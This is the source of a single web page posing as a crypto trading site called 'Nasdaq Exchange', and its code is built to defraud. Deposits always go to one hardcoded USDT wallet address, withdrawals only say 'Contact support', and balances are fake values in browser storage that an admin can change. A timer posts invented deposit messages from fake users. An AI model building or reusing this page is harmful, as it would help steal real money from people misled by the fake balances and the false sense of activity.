<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Nasdaq Exchange</title>

<style>
body{
margin:0;
font-family:Arial;
background:#0b0e11;
color:white;
}

/* HEADER */
.header{
padding:15px;
font-size:22px;
font-weight:bold;
text-align:center;
}

/* CARD */
.card{
background:#161a1e;
margin:12px;
padding:15px;
border-radius:12px;
}

/* BUTTON */
.btn{
background:#fcd535;
border:none;
padding:8px 12px;
border-radius:6px;
margin:3px;
}

/* COIN */
.coin{
display:flex;
justify-content:space-between;
padding:10px;
border-bottom:1px solid #222;
}

/* NAV */
.nav{
position:fixed;
bottom:0;
width:100%;
display:flex;
background:#111;
}

.nav div{
flex:1;
text-align:center;
padding:10px;
}

/* PAGE */
.page{display:none;}
.active{display:block;}

/* POPUP */
.popup{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:#000;
z-index:999;
padding:20px;
overflow:auto;
}
</style>

</head>

<body>

<div class="header">📊 Nasdaq Exchange</div>

<!-- LOGIN -->
<div id="login" class="page active">
<div class="card">
<h3>Login / Signup</h3>
<input id="user" placeholder="Username"><br><br>
<input id="pass" type="password" placeholder="Password"><br><br>
<input id="ref" placeholder="Referral Code"><br><br>

<button class="btn" onclick="signup()">Signup</button>
<button class="btn" onclick="login()">Login</button>
</div>
</div>

<!-- HOME -->
<div id="home" class="page">
<div class="card">
<h2 id="bal">Balance: $1000</h2>
<button class="btn" onclick="buy()">Deposit</button>
<button class="btn" onclick="adminAdd()">+ Admin</button>
<button class="btn" onclick="adminRemove()">- Admin</button>
</div>

<div class="card">
<h3>🔥 Hot Coins</h3>
<div id="hot"></div>
</div>
</div>

<!-- MARKET -->
<div id="market" class="page">
<div class="card">
<h3>Market</h3>
<div id="coinList">Loading...</div>
</div>
</div>

<!-- ASSETS -->
<div id="assets" class="page">
<div class="card">
<h3>Your Assets</h3>
<p id="bal2">$1000</p>
<button class="btn" onclick="buy()">Deposit</button>
<button class="btn" onclick="sell()">Withdraw</button>

<h4>Live Activity</h4>
<div id="activity"></div>
</div>
</div>

<!-- NAV -->
<div class="nav">
<div onclick="show('home')">Home</div>
<div onclick="show('market')">Market</div>
<div onclick="show('assets')">Assets</div>
</div>

<script>

// NAV
function show(p){
document.querySelectorAll(".page").forEach(x=>x.classList.remove("active"));
document.getElementById(p).classList.add("active");
}

// USERS
let users = JSON.parse(localStorage.getItem("users")) || {};
let adminUser="admin";

// SIGNUP
function signup(){
let u=user.value.trim();
let p=pass.value.trim();
let r=ref.value.trim();

if(!u||!p)return alert("Fill all fields");

let bal=1000;
if(r==="@Ganjiwan@"){bal+=100;}

users[u]={password:p,balance:bal};
localStorage.setItem("users",JSON.stringify(users));

alert("Signup success");
}

// LOGIN
function login(){
let u=user.value.trim();
let p=pass.value.trim();

if(!users[u])return alert("User not found");
if(users[u].password!==p)return alert("Wrong password");

localStorage.setItem("loggedUser",u);

update(u);
show("home");
}

// AUTO LOGIN
window.onload=function(){
let u=localStorage.getItem("loggedUser");
if(u && users[u]){
update(u);
show("home");
}
}

// UPDATE
function update(u){
localStorage.setItem("users",JSON.stringify(users));
bal.innerText="Balance: $"+users[u].balance;
bal2.innerText="$"+users[u].balance;
}

// ADMIN
function adminAdd(){
let u=localStorage.getItem("loggedUser");
if(u!=="admin")return alert("Only admin");

let amt=parseInt(prompt("Amount"));
users[u].balance+=amt;
update(u);
}

function adminRemove(){
let u=localStorage.getItem("loggedUser");
if(u!=="admin")return alert("Only admin");

let amt=parseInt(prompt("Amount"));
users[u].balance-=amt;
update(u);
}

// MARKET
async function loadMarket(){
let res=await fetch("https://api.binance.com/api/v3/ticker/price");
let data=await res.json();

coinList.innerHTML="";
hot.innerHTML="";

data.slice(0,100).forEach((c,i)=>{
if(c.symbol.endsWith("USDT")){
let price=(c.price*0.95).toFixed(2);

// MARKET
coinList.innerHTML+=`
<div class="coin" onclick="openChart('${c.symbol}')">
${c.symbol} $${price}
<div>
<button onclick="buy();event.stopPropagation()">Buy</button>
<button onclick="sell();event.stopPropagation()">Sell</button>
</div>
</div>`;

// HOT COINS
if(i<5){
hot.innerHTML+=`
<div class="coin">
${c.symbol} $${price}
<button onclick="buy()">Buy</button>
</div>`;
}

}
});
}
loadMarket();

// POPUP
function createPopup(content){
let div=document.createElement("div");
div.className="popup";
div.innerHTML=content;
document.body.appendChild(div);
}

function closePopup(){
document.querySelector(".popup").remove();
}

// BUY
function buy(){
createPopup(`
<h2>Deposit USDT (TRC20)</h2>

<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TQWTVcqKppmKvx53rdNRbADhRrLbft7Gcm">

<p id="addr">TQWTVcqKppmKvx53rdNRbADhRrLbft7Gcm</p>

<button onclick="copy()">Copy</button>
<button onclick="closePopup()">Close</button>
`);
}

function copy(){
navigator.clipboard.writeText(addr.innerText);
alert("Copied");
}

// SELL
function sell(){
alert("Contact support");
}

// CHART
function openChart(symbol){
createPopup(`
<iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:${symbol}&theme=dark"
width="100%" height="90%"></iframe>

<button onclick="closePopup()">Close</button>
`);
}

// ACTIVITY
setInterval(()=>{
let names=["Ali","Ahmed","Sara","John","Zain"];
let msg=names[Math.floor(Math.random()*names.length)]+" deposited $"+Math.floor(Math.random()*2000);
activity.innerHTML+="<p style='color:lime'>"+msg+"</p>";
},3000);

</script>

</body>
</html>
